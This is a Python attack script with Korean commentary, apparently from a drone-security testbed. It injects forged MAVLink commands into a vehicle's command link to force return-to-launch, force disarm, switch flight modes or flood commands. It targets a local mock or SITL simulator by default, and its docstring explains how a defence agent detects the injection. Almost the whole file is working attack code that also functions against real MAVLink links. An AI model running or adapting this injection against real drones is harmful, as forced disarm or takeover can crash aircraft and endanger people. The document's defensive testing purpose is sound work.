"""
공격 #1 — C2 명령 주입 / MITM

위협모델: STRIDE-Tampering, TARA(명령 주입→제어권 상실), STPA-Sec(불안전 제어행동)

원리
----
MAVLink(및 대다수 전술 데이터링크)는 기본적으로 명령 무결성/인증이 약하다. 공격자가
C2 링크의 명령 엔드포인트에 접근하면, 정상 운용자가 보내지 않은 명령(모드 변경,
강제 RTL, 무장/해제 등)을 주입해 임무를 교란하거나 기체를 탈취할 수 있다.

이 스크립트는 목표(mock_vehicle 또는 SITL)의 명령 포트로 위조 명령을 전송한다.
방어 관점: 주입된 명령은 HEARTBEAT.custom_mode 변화와 COMMAND_ACK 로 텔레메트리에
나타나므로, defense.agent 가 '비정상 명령 빈도 / 예상치 못한 모드 전환'으로 탐지한다.

사용:
    python -m attacks.c2_injection --target udpout:127.0.0.1:14555 --command rtl
    python -m attacks.c2_injection --target udpout:127.0.0.1:14555 --command flood --count 40
"""
from __future__ import annotations

import argparse
import time

from pymavlink import mavutil
from pymavlink.dialects.v20 import common as mav

TARGET_SYS = 1
TARGET_COMP = 1


def connect(target: str):
    m = mavutil.mavlink_connection(target, source_system=255)  # 255 = GCS
    return m


def cmd_rtl(m):
    m.mav.command_long_send(
        TARGET_SYS, TARGET_COMP, mav.MAV_CMD_NAV_RETURN_TO_LAUNCH,
        0, 0, 0, 0, 0, 0, 0, 0)
    print("[inject] MAV_CMD_NAV_RETURN_TO_LAUNCH (강제 귀환) 전송")


def cmd_disarm(m):
    m.mav.command_long_send(
        TARGET_SYS, TARGET_COMP, mav.MAV_CMD_COMPONENT_ARM_DISARM,
        0, 0, 0, 0, 0, 0, 0, 0)  # param1=0 → disarm
    print("[inject] MAV_CMD_COMPONENT_ARM_DISARM param1=0 (강제 무장해제) 전송")


def cmd_setmode(m, mode_id: int):
    m.mav.command_long_send(
        TARGET_SYS, TARGET_COMP, mav.MAV_CMD_DO_SET_MODE,
        0, mav.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, mode_id, 0, 0, 0, 0, 0)
    print(f"[inject] MAV_CMD_DO_SET_MODE → custom_mode={mode_id} 전송")


def cmd_flood(m, count: int):
    """명령 폭주(rapid replay) — 방어의 '비정상 명령 빈도' 탐지를 유발."""
    print(f"[inject] 명령 폭주 {count}건 전송 시작")
    for i in range(count):
        cmd_setmode(m, 5 + (i % 3))
        time.sleep(0.05)
    print("[inject] 폭주 완료")


def main():
    ap = argparse.ArgumentParser(description="C2 명령 주입 공격")
    ap.add_argument("--target", default="udpout:127.0.0.1:14555",
                    help="목표 차량의 명령 수신 포트 (mock 기본: telem포트+5)")
    ap.add_argument("--command", choices=["rtl", "disarm", "setmode", "flood"],
                    default="rtl")
    ap.add_argument("--mode-id", type=int, default=5)
    ap.add_argument("--count", type=int, default=40)
    args = ap.parse_args()

    m = connect(args.target)
    print(f"[c2_injection] target={args.target} 에 명령 주입")
    if args.command == "rtl":
        cmd_rtl(m)
    elif args.command == "disarm":
        cmd_disarm(m)
    elif args.command == "setmode":
        cmd_setmode(m, args.mode_id)
    elif args.command == "flood":
        cmd_flood(m, args.count)
    time.sleep(0.3)  # 전송 flush


if __name__ == "__main__":
    main()
